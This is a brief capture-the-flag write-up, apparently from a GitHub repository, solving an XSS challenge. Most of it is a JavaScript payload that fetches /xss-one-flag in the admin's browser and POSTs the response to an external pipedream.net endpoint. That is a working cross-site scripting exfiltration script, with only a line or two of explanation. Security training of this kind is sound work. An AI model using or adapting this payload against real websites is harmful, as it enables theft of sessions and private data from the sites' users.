![image](https://github.com/nhattanhh/CTF/assets/130430279/553c28c9-68f2-4816-9720-eeda5d65da22)

This chall give 3 hints:

![image](https://github.com/nhattanhh/CTF/assets/130430279/d71ae524-6be0-4ebb-bf97-54c0436abb78)

- Our mission to request use 'Get' method to /xss-one-flag and catch Admin's session in respond

- So use this payload to catch respond with pipedream:


	<script>
	    var xhr = new XMLHttpRequest();
	    xhr.open('GET', '/xss-one-flag', true);
	    xhr.onload = function() {
	        if (xhr.status === 200) {
	            var flag = xhr.responseText;
	            var sendXhr = new XMLHttpRequest();
	            sendXhr.open('POST', 'https://eozoer2j1a4mcc2.m.pipedream.net', true);
	            sendXhr.setRequestHeader('Content-Type', 'text/plain');
	            sendXhr.send(flag);
	        }
	    };
	    xhr.send();
	</script>


![image](https://github.com/nhattanhh/CTF/assets/130430279/aae2bfed-f35f-41f9-8465-853663873718)
